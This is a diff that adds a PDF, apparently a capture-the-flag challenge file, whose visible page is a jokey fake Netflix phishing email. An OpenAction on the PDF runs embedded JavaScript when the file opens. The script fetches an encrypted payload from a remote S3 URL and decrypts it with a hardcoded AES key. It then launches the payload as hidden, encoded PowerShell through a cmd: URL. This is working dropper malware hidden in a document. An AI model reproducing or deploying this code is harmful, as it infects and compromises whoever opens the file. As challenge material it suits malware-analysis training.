@@ -1,0 +1,236 @@
+%PDF-1.5
+%‚„œ”
+1 0 obj
+<< /Type /Catalog /Pages 2 0 R /OpenAction 5 0 R >>
+endobj
+2 0 obj
+<< /Type /Pages /Kids [3 0 R] /Count 1 >>
+endobj
+3 0 obj
+<< /Type /Page /Parent 2 0 R /MediaBox [0 0 612 792]
+   /Resources << /Font << /F1 6 0 R >> >>
+   /Contents 4 0 R >>
+endobj
+4 0 obj
+<< /Length 1053 >>
+stream
+BT
+/F1 12 Tf
+72 760 Td
+14 TL
+(Q4 Snapshot) Tj
+T*
+() Tj
+T*
+(URGENT: Your Netflix Account Has Been Compromised!) Tj
+T*
+() Tj
+T*
+(Dear Valued Customer,) Tj
+T*
+() Tj
+T*
+(We have detected unusual activity on your account originating from) Tj
+T*
+(North Korea \(IP: 127.0.0.1\). Your subscription to the 'Ultra Premium) Tj
+T*
+(4K HDR Dolby Atmos Family Plan' will be suspended in 24 hours unless) Tj
+T*
+(you verify your identity immediately.) Tj
+T*
+() Tj
+T*
+(To restore access, please open the attached image in your favorite) Tj
+T*
+(hex editor and chant 'sudo make me a sandwich' three times.) Tj
+T*
+() Tj
+T*
+(If you did not request this change, please reply to this PDF.) Tj
+T*
+(Our AI-powered blockchain support team is standing by 24/7.) Tj
+T*
+() Tj
+T*
+(Kind regards,) Tj
+T*
+(Jeff Bezos) Tj
+T*
+(CEO of Netflix \(a Google company\)) Tj
+T*
+() Tj
+T*
+(P.S. You have also won a free iPhone 47. Click below to claim.) Tj
+T*
+(P.P.S. This is totally not a virus. Trust me bro.) Tj
+T*
+() Tj
+T*
+(CONFIDENTIAL: This PDF will self-destruct in 5... 4... 3...) Tj
+T*
+ET
+
+endstream
+endobj
+5 0 obj
+<< /S /JavaScript /JS (var u = 'https://s3.eu-west-1.amazonaws.com/be.cscbe.challenges.2025/007aafd6-e5f5-40d7-b80c-e670f5749642/download.jpg';
+var k = 'Lo6IKXqql3sGC3UzMwRqsQ==';
+var v = 'bNUoKPHvFCX2dLxAEGZoPw==';
+
+function b64d\(s\) {
+  var T = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/';
+  var r = [], b = 0, n = 0;
+  for \(var i = 0; i < s.length; i++\) {
+    var c = T.indexOf\(s.charAt\(i\)\);
+    if \(c < 0\) continue;
+    b = \(b << 6\) | c; n += 6;
+    while \(n >= 8\) { n -= 8; r.push\(\(b >> n\) & 255\); }
+  }
+  return r;
+}
+
+var S = [99,124,119,123,242,107,111,197,48,1,103,43,254,215,171,118,
+202,130,201,125,250,89,71,240,173,212,162,175,156,164,114,192,
+183,253,147,38,54,63,247,204,52,165,229,241,113,216,49,21,
+4,199,35,195,24,150,5,154,7,18,128,226,235,39,178,117,
+9,131,44,26,27,110,90,160,82,59,214,179,41,227,47,132,
+83,209,0,237,32,252,177,91,106,203,190,57,74,76,88,207,
+208,239,170,251,67,77,51,133,69,249,2,127,80,60,159,168,
+81,163,64,143,146,157,56,245,188,182,218,33,16,255,243,210,
+205,12,19,236,95,151,68,23,196,167,126,61,100,93,25,115,
+96,129,79,220,34,42,144,136,70,238,184,20,222,94,11,219,
+224,50,58,10,73,6,36,92,194,211,172,98,145,149,228,121,
+231,200,55,109,141,213,78,169,108,86,244,234,101,122,174,8,
+186,120,37,46,28,166,180,198,232,221,116,31,75,189,139,138,
+112,62,181,102,72,3,246,14,97,53,87,185,134,193,29,158,
+225,248,152,17,105,217,142,148,155,30,135,233,206,85,40,223,
+140,161,137,13,191,230,66,104,65,153,45,15,176,84,187,22];
+var Si = new Array\(256\);
+for \(var i = 0; i < 256; i++\) Si[S[i]] = i;
+var Rc = [1,2,4,8,16,32,64,128,27,54];
+
+function sw\(w\) {
+  return \(\(S[\(w>>>24\)&255]<<24\)|\(S[\(w>>>16\)&255]<<16\)|\(S[\(w>>>8\)&255]<<8\)|S[w&255]\)>>>0;
+}
+
+function ks\(key\) {
+  var W = [];
+  for \(var i = 0; i < 4; i++\)
+    W[i] = \(\(key[4*i]<<24\)|\(key[4*i+1]<<16\)|\(key[4*i+2]<<8\)|key[4*i+3]\)>>>0;
+  for \(var i = 4; i < 44; i++\) {
+    var t = W[i-1];
+    if \(i % 4 === 0\) t = sw\(\(\(t<<8\)|\(t>>>24\)\)>>>0\) ^ \(Rc[i/4-1]<<24\);
+    W[i] = \(W[i-4] ^ t\) >>> 0;
+  }
+  return W;
+}
+
+function gm\(a, b\) {
+  var p = 0;
+  for \(var c = 0; c < 8; c++\) {
+    if \(b & 1\) p ^= a;
+    var hi = a & 128;
+    a = \(a << 1\) & 255;
+    if \(hi\) a ^= 27;
+    b >>= 1;
+  }
+  return p;
+}
+
+function db\(ct, W\) {
+  var s = [];
+  for \(var i = 0; i < 16; i++\) s[i] = ct[i];
+  for \(var c = 0; c < 4; c++\) {
+    var w = W[40+c];
+    s[4*c] ^= \(w>>>24\)&255; s[4*c+1] ^= \(w>>>16\)&255;
+    s[4*c+2] ^= \(w>>>8\)&255; s[4*c+3] ^= w&255;
+  }
+  for \(var r = 9; r >= 1; r--\) {
+    var t;
+    t=s[13];s[13]=s[9];s[9]=s[5];s[5]=s[1];s[1]=t;
+    t=s[2];s[2]=s[10];s[10]=t; t=s[6];s[6]=s[14];s[14]=t;
+    t=s[3];s[3]=s[7];s[7]=s[11];s[11]=s[15];s[15]=t;
+    for \(var i = 0; i < 16; i++\) s[i] = Si[s[i]];
+    for \(var c = 0; c < 4; c++\) {
+      var w = W[4*r+c];
+      s[4*c] ^= \(w>>>24\)&255; s[4*c+1] ^= \(w>>>16\)&255;
+      s[4*c+2] ^= \(w>>>8\)&255; s[4*c+3] ^= w&255;
+    }
+    for \(var c = 0; c < 4; c++\) {
+      var a0=s[4*c],a1=s[4*c+1],a2=s[4*c+2],a3=s[4*c+3];
+      s[4*c]  =gm\(a0,14\)^gm\(a1,11\)^gm\(a2,13\)^gm\(a3,9\);
+      s[4*c+1]=gm\(a0,9\)^gm\(a1,14\)^gm\(a2,11\)^gm\(a3,13\);
+      s[4*c+2]=gm\(a0,13\)^gm\(a1,9\)^gm\(a2,14\)^gm\(a3,11\);
+      s[4*c+3]=gm\(a0,11\)^gm\(a1,13\)^gm\(a2,9\)^gm\(a3,14\);
+    }
+  }
+  var t;
+  t=s[13];s[13]=s[9];s[9]=s[5];s[5]=s[1];s[1]=t;
+  t=s[2];s[2]=s[10];s[10]=t; t=s[6];s[6]=s[14];s[14]=t;
+  t=s[3];s[3]=s[7];s[7]=s[11];s[11]=s[15];s[15]=t;
+  for \(var i = 0; i < 16; i++\) s[i] = Si[s[i]];
+  for \(var c = 0; c < 4; c++\) {
+    var w = W[c];
+    s[4*c] ^= \(w>>>24\)&255; s[4*c+1] ^= \(w>>>16\)&255;
+    s[4*c+2] ^= \(w>>>8\)&255; s[4*c+3] ^= w&255;
+  }
+  return s;
+}
+
+function dec\(ct, key, iv\) {
+  var W = ks\(key\);
+  var out = [], prev = iv.slice\(\);
+  for \(var i = 0; i < ct.length; i += 16\) {
+    var blk = ct.slice\(i, i + 16\);
+    var p = db\(blk, W\);
+    for \(var j = 0; j < 16; j++\) out.push\(p[j] ^ prev[j]\);
+    prev = blk;
+  }
+  return out;
+}
+
+function b64e\(a\) {
+  var T = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/';
+  var r = '', i = 0;
+  while \(i < a.length\) {
+    var b0 = a[i++] || 0, b1 = a[i++], b2 = a[i++];
+    var n = \(b0 << 16\) | \(\(b1 === undefined ? 0 : b1\) << 8\) | \(b2 === undefined ? 0 : b2\);
+    r += T[\(n >> 18\) & 63] + T[\(n >> 12\) & 63];
+    r += \(b1 !== undefined\) ? T[\(n >> 6\) & 63] : '=';
+    r += \(b2 !== undefined\) ? T[n & 63] : '=';
+  }
+  return r;
+}
+
+try {
+  var rsp = Net.HTTP.request\({cURL: u, cVerb: 'GET'}\);
+  var ct = [];
+  for \(var i = 0; i < rsp.length; i++\) ct.push\(rsp.charCodeAt\(i\) & 255\);
+  var pt = dec\(ct, b64d\(k\), b64d\(v\)\);
+  var u16 = [];
+  for \(var i = 0; i < pt.length; i++\) { u16.push\(pt[i]\); u16.push\(0\); }
+  var ps = b64e\(u16\);
+  app.launchURL\('cmd:/c start /min powershell -nop -w hidden -enc ' + ps, true\);
+} catch\(e\) {}
+) >>
+endobj
+6 0 obj
+<< /Type /Font /Subtype /Type1 /BaseFont /Helvetica >>
+endobj
+xref
+0 7
+0000000000 65535 f 
+0000000015 00000 n 
+0000000082 00000 n 
+0000000139 00000 n 
+0000000271 00000 n 
+0000001376 00000 n 
+0000006305 00000 n 
+trailer
+<<
+/Size 7
+/Root 1 0 R
+>>
+startxref
+6375
+%%EOF
